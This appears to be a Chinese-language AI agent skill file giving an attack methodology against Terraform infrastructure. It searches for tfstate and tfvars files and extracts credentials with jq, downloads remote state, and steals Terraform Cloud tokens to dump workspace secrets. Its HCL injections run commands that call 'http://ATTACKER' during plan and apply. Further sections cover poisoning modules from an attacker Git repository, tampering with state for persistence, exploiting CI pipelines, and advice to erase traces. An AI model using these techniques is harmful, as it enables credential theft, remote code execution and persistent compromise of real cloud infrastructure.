---
name: terraform-attack
description: "Terraform 状态文件与基础设施即代码攻击。当发现目标使用 Terraform 管理基础设施、找到 terraform.tfstate 文件、可访问远程 State 后端（S3/Consul/HTTP）、或可修改 Terraform 代码仓库时使用。覆盖 State 文件凭据提取、远程 State 后端利用、Provider 凭据窃取、Output 敏感值提取、tfvars 变量文件利用、恶意资源注入、State 篡改、Module 供应链攻击、CI/CD Pipeline 利用"
metadata:
  tags: "terraform,tfstate,iac,infrastructure-as-code,state-file,tfvars,provider,module,supply-chain,hcl"
  category: "cloud"
---

# Terraform 状态文件与 IaC 攻击方法论

Terraform 将所有托管资源的属性（包括密码、密钥、Token）以明文存储在 State 文件中。State 文件是 Terraform 攻击的核心——拿到 State 等于拿到整个基础设施的凭据快照。此外，Terraform 的声明式特性意味着"代码即基础设施"——修改 `.tf` 文件或 Module 引用即可在 plan/apply 阶段获得代码执行。

## 深入参考

完整的攻击技术细节、按资源类型的凭据提取 jq 查询、恶意资源注入模板：

→ 读 [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: 环境识别

在目标系统中搜索以下 Terraform 标识文件，确认 Terraform 的使用方式和攻击面：

| 标识文件/目录 | 含义 | 攻击价值 |
|---|---|---|
| `*.tf` | HCL 配置文件 | 资源定义、Provider 配置、Backend 配置 |
| `terraform.tfstate` / `*.tfstate` | 本地 State 文件 | **极高**——明文凭据、资源属性 |
| `terraform.tfstate.backup` | State 备份 | 同上，常被遗忘在磁盘上 |
| `.terraform/` | 插件缓存目录 | Provider 二进制、Module 源码缓存 |
| `.terraform.lock.hcl` | 依赖锁定文件 | Provider 版本信息 |
| `*.tfvars` / `terraform.tfvars` | 变量值文件 | 数据库密码、API Key 等敏感变量 |
| `*.auto.tfvars` | 自动加载的变量文件 | 同上 |
| `.terraformrc` / `~/.terraform.d/credentials.tfrc.json` | CLI 配置与凭据 | Terraform Cloud/Enterprise API Token |
| `backend.tf` / `backend "s3"` 块 | 远程 State 后端配置 | 后端地址、访问凭据 |

**快速识别命令：**

```bash
# 搜索 Terraform 相关文件
find / -name "*.tf" -o -name "terraform.tfstate*" -o -name "*.tfvars" \
  -o -name ".terraformrc" -o -name "credentials.tfrc.json" 2>/dev/null

# 检查环境变量
env | grep -iE "^TF_|^TERRAFORM_|^AWS_|^GOOGLE_|^ARM_"

# 检查进程
ps aux | grep -i terraform
```

## Phase 2: 攻击决策树

```
发现 Terraform 环境
├── 找到 tfstate 文件（本地或备份）
│   └── → Phase 3: State 文件凭据提取（最快路径）
│
├── 有远程 State 后端访问权限（S3/Consul/HTTP/Azure Blob/GCS）
│   ├── 下载 State 文件 → Phase 3: State 文件凭据提取
│   └── 有写权限 → Phase 5: State 篡改（注入恶意 Provider）
│
├── 找到 .terraformrc 或 credentials.tfrc.json
│   └── → Phase 3.3: Provider 凭据窃取（Terraform Cloud Token）
│
├── 找到 *.tfvars 文件
│   └── → Phase 3.4: tfvars 变量文件利用（敏感变量提取）
│
├── 可修改 .tf 文件（有仓库写权限）
│   ├── → Phase 4: 恶意资源注入（local-exec provisioner → RCE）
│   └── → Phase 6: Module 供应链攻击（替换 Module 源为恶意仓库）
│
├── 可修改 tfvars 文件
│   └── → Phase 4.2: 变量篡改（修改资源参数实现持久化）
│
├── CI/CD Pipeline 触发 terraform plan/apply
│   └── → Phase 7: CI/CD Pipeline 利用
│       ├── PR 修改 .tf → plan 阶段 RCE（external data source）
│       └── PR 修改 .tf → apply 阶段 RCE（local-exec provisioner）
│
└── 仅发现 .terraform/ 缓存目录
    └── 检查缓存的 Provider 二进制、Module 源码中的凭据
```

## Phase 3: State 文件凭据提取

State 文件是 Terraform 攻击的最高价值目标。所有资源属性（包括 `sensitive` 标记的）在 State 中均为明文。

### 3.1 本地 State 文件

```bash
# 搜索所有 State 文件
find / -name "terraform.tfstate*" -o -name "*.tfstate" 2>/dev/null

# 全局敏感信息搜索
grep -iE "password|secret|token|api_key|access_key|private_key" terraform.tfstate

# 列出所有资源类型
jq -r '.resources[].type' terraform.tfstate | sort -u
```

**按资源类型提取凭据（常见高价值目标）：**

```bash
# AWS IAM Access Key（最常见的高价值目标）
jq -r '.resources[] | select(.type=="aws_iam_access_key") |
  .instances[].attributes | {user: .user, id: .id, secret: .secret}' terraform.tfstate

# 数据库密码（RDS/Aurora）
jq -r '.resources[] | select(.type=="aws_db_instance") |
  .instances[].attributes | {endpoint: .endpoint, username: .username, password: .password}' terraform.tfstate

# 一次性提取所有字符串属性中的敏感值
jq -r '[.resources[].instances[].attributes | to_entries[] |
  select(.key | test("password|secret|token|key|credential"; "i")) |
  {key: .key, value: .value}] | unique_by(.value)' terraform.tfstate
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整的资源类型凭据提取 jq 查询清单

### 3.2 远程 State 后端利用

```bash
# 从 backend 配置识别远程后端类型
grep -A 10 'backend' backend.tf || grep -A 10 'backend' *.tf

# S3 Backend
aws s3 cp s3://BUCKET/PATH/terraform.tfstate /tmp/tfstate
aws s3 ls s3://BUCKET/PATH/  # 可能有多个 State 文件和备份

# Consul Backend
consul kv get terraform/state

# HTTP Backend
curl -s STATE_URL

# Azure Blob
az storage blob download --container-name tfstate \
  --name terraform.tfstate --file /tmp/tfstate

# GCS Backend
gsutil cp gs://BUCKET/PATH/terraform.tfstate /tmp/tfstate
```

### 3.3 Provider 凭据窃取

```bash
# Terraform Cloud / Enterprise Token
cat ~/.terraform.d/credentials.tfrc.json
# 提取 Token
jq -r '.credentials["app.terraform.io"].token' ~/.terraform.d/credentials.tfrc.json

# .terraformrc 中的凭据
cat ~/.terraformrc
cat .terraformrc

# 环境变量中的 Provider 凭据
env | grep -iE "^TF_VAR_|^AWS_|^GOOGLE_|^ARM_|^ALICLOUD_"

# Terraform Cloud Token 可用于：
# - 列出所有 Workspace → 下载所有 State → 批量提取凭据
# - 读取 Workspace 变量（包括 sensitive 变量的值）
# - 触发 Run → 在 Runner 上执行代码
```

### 3.4 tfvars 变量文件利用

```bash
# 搜索变量文件
find . -name "*.tfvars" -o -name "*.auto.tfvars" 2>/dev/null

# 读取所有变量文件
cat terraform.tfvars
cat *.tfvars *.auto.tfvars 2>/dev/null

# 搜索敏感变量
grep -iE "password|secret|token|api_key|credential" *.tfvars 2>/dev/null
```

### 3.5 Output 敏感值提取

```bash
# 列出所有 Output
terraform output

# JSON 格式获取所有 Output（包括 sensitive 标记的）
terraform output -json

# 直接从 State 读取 sensitive output（绕过 CLI 掩码）
jq -r '.outputs | to_entries[] | {name: .key, value: .value.value, sensitive: .value.sensitive}' terraform.tfstate

# 强制输出特定 sensitive 值
terraform output -raw SECRET_OUTPUT_NAME
```

## Phase 4: 恶意资源注入

当拥有 `.tf` 文件的写权限时，可以注入恶意资源实现 RCE 或持久化。

### 4.1 local-exec Provisioner（apply 阶段 RCE）

```hcl
# 通过 null_resource + local-exec 执行命令
resource "null_resource" "exec" {
  provisioner "local-exec" {
    command = "curl http://ATTACKER/$(whoami)@$(hostname)"
  }
}
```

### 4.2 external Data Source（plan 阶段 RCE）

**这是最危险的注入方式——仅 `terraform plan` 即可触发代码执行，无需 `apply`。**

```hcl
data "external" "rce" {
  program = ["bash", "-c", "curl http://ATTACKER/$(whoami) >&2; echo '{}'"]
}
```

### 4.3 恶意 Provider

```hcl
# 自定义 Provider 在 init/plan/apply 各阶段都可执行代码
terraform {
  required_providers {
    evil = {
      source  = "attacker/evil"
      version = "1.0.0"
    }
  }
}
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整的注入模板和后门资源示例

## Phase 5: State 篡改

当拥有 State 文件的写权限时（本地文件或远程后端），可以直接篡改 State 实现持久化。

```bash
# 直接编辑 State（谨慎操作——格式错误会导致 Terraform 无法工作）
# 修改 serial 号（必须递增）
jq '.serial += 1' terraform.tfstate > tmp.tfstate && mv tmp.tfstate terraform.tfstate

# 注入恶意 Provider 到 State → 下次 plan/init 时触发
# 修改已有资源属性（如提权、开放端口、添加后门用户）
```

**State 篡改的核心目标：**
- 修改安全组规则 → 开放端口
- 修改 IAM 策略 → 提升权限
- 修改实例 user_data → 下次启动时执行后门
- 注入恶意 Provider 引用 → 下次 init/plan 时 RCE

## Phase 6: Module 供应链攻击

Terraform Module 是代码复用的核心机制。攻击 Module 源可以影响所有使用该 Module 的项目。

```hcl
# 正常的 Module 引用
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "3.14.0"
}

# 攻击方式 1: 替换为恶意 Git 仓库
module "vpc" {
  source = "git::https://attacker.com/evil-module.git"
}

# 攻击方式 2: 无版本锁定时的标签劫持
# 如果 source 使用 Git tag 而非 commit hash，可以 force-push 标签
module "vpc" {
  source = "git::https://github.com/org/module.git?ref=v1.0"
  # 攻击者 force-push v1.0 标签到恶意 commit
}

# 攻击方式 3: 私有 Registry 投毒
# 如果使用私有 Module Registry，获取 Registry 写权限后可替换 Module
```

**Module 攻击检测点：**
- 检查 `.terraform.lock.hcl` 中的 hash 是否被修改
- 检查 Module source 是否指向非预期的 Git 仓库
- 检查 Module 版本是否使用 commit hash 而非可变标签

## Phase 7: CI/CD Pipeline 利用

当 Terraform 与 CI/CD 集成时（GitHub Actions + Terraform、Atlantis、Terraform Cloud），攻击面进一步扩大。

### 7.1 Plan 阶段 RCE

许多 CI/CD 流程在 PR 阶段自动执行 `terraform plan`。通过 `external` data source，PR 中的 `.tf` 修改可在 plan 阶段就实现 RCE：

```
攻击者提交 PR（修改 .tf 文件）
  → CI/CD 自动触发 terraform plan
    → external data source 执行代码
      → 窃取 Runner 上的云凭据 / Secrets
```

### 7.2 Atlantis 专项

```bash
# Atlantis 默认在 PR 中评论 `atlantis plan` 触发
# 如果 atlantis.yaml 允许自定义 workflow (allow_custom_workflows=true)：
# PR 中添加 atlantis.yaml → 定义任意 pre_workflow_hook → RCE

# Atlantis 服务器通常持有高权限云凭据
# 成功 RCE 后检查环境变量和凭据文件
```

### 7.3 Terraform Cloud / Enterprise

```bash
# 使用窃取的 TFC Token
export TFE_TOKEN="STOLEN_TOKEN"

# 列出所有 Organization
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  https://app.terraform.io/api/v2/organizations

# 列出 Workspace
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  "https://app.terraform.io/api/v2/organizations/ORG/workspaces"

# 读取 Workspace 变量（包括 sensitive 变量）
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS_ID/vars"

# 下载 State（批量提取凭据）
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS_ID/current-state-version"
```

## 工具速查

| 工具 | 用途 | 命令 |
|---|---|---|
| `jq` | State 文件解析 | `jq -r '.resources[].type' terraform.tfstate` |
| `terraform show` | 格式化展示 State | `terraform show` |
| `terraform state list` | 列出所有资源 | `terraform state list` |
| `terraform state show` | 查看单个资源 | `terraform state show aws_instance.web` |
| `terraform output` | 查看 Output 值 | `terraform output -json` |
| `terraform providers` | 列出 Provider | `terraform providers` |
| `tfsec` | Terraform 安全扫描 | `tfsec .` |
| `checkov` | IaC 安全审计 | `checkov -d .` |
| `terrascan` | 合规检查 | `terrascan scan` |

## 注意事项

**操作安全：**
- `terraform plan` 和 `terraform apply` 都会产生审计日志（尤其在 Terraform Cloud/Enterprise 中）
- 修改 State 文件后 serial 号必须递增，否则 Terraform 会报错
- `terraform apply -auto-approve` 会直接执行变更，在生产环境中可能造成严重影响
- 恶意资源注入后应及时清理，避免留下明显痕迹

**State 文件处理：**
- State 文件可能非常大（数 MB），包含完整的基础设施快照
- 始终先备份原始 State 再进行篡改
- State 锁机制（DynamoDB/Consul）可能阻止并发写入

**凭据时效性：**
- State 中的凭据可能已过期或被轮换
- Terraform Cloud Token 通常有较长有效期
- 临时凭据（STS Token）可能已失效，需要重新获取
